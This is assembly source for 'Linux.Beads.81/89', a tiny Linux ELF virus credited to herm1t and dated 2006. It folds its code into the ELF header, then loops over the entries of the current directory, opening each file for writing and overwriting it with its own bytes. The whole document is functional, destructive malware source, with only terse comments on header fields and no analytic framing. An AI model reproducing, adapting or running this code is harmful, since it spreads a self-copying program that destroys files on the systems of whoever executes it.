; Linux.Beads.81/89 (c) herm1t 2006-04-30
		BITS	32
		CPU	386
		section	.text
		org	0

ehdr:		db	0x7F,0x45,0x4c,0x46	; 0 - e_ident
.entry:		db	0x6a,0x1c		;	push 28
		db	0x5b			;	pop ebx
		db	0x6a,0x05		;	push 5
		db	0x58			;	pop eax
		db	0x31,0xc9		;	xor ecx,ecx
		db	0xcd,0x80		;	int 0x80
		db	0x93			;	xchg eax,ebx
		db	0x90
		db	0x02,0x00,0x03,0x00	; 16 - e_machine, e_type
						;*20 - e_version
.next:		db	0x6a, 0x59		;	push 89
		jmp	.J0
		dd	.entry			; 24 - e_entry
		db	0x2e,0x00,0x00,0x00	; 28 - e_phoff
						;*32 - e_shoff
						;*36 - e_flags
						;*40 - e_ehsize (0x34, 0x00)
;.exit:		int1
.J0:		db	0x58			;	pop eax
		db	0x89, 0xe1		;	mov ecx,esp
		db	0xcd, 0x80		;	int 0x80
		db	0x48			;	dec eax
		db	0x53			;	push ebx
		db	0x90
		jz	.J1			; fallthrough will cause sigsegv
		db	0x20,0x00		; 42 - e_phentsize
		db	0x01,0x00		; 44 - e_phnum
						;*46 - e_shentsize
						;*48 - e_shnum, e_shstrndx
		db	0x01,0x00,0x00,0x00	; p_type
		dd	0			; p_offset
		dd	0			; p_vaddr
						;*p_paddr
.J1:		push	byte 4			;##

%if LINUX >= 25
		jmp	.more
		dd	SIZE			; p_filesz
%endif
.more:		lea	ebx, [ecx + 10]		; dirent.d_name
						;*p_align
						;*p_memsz
						;*p_flags
%if LINUX >= 25
		db	0x16,0x07		; high byte of p_memsz, and
						; low byte of flags (push ss/pop es)
%endif
		inc	eax
		xchg	ecx, eax		; ecx = O_WRONLY		
		push	byte 5
		pop	eax
		push	byte SIZE		;@
		int	0x80
		xchg	eax, ebx
		pop	edx			;@
		pop	eax			;##
		dec	ecx
		int	0x80
		pop	ebx
		jmp	.next
SIZE		equ	$ - ehdr
;EOF
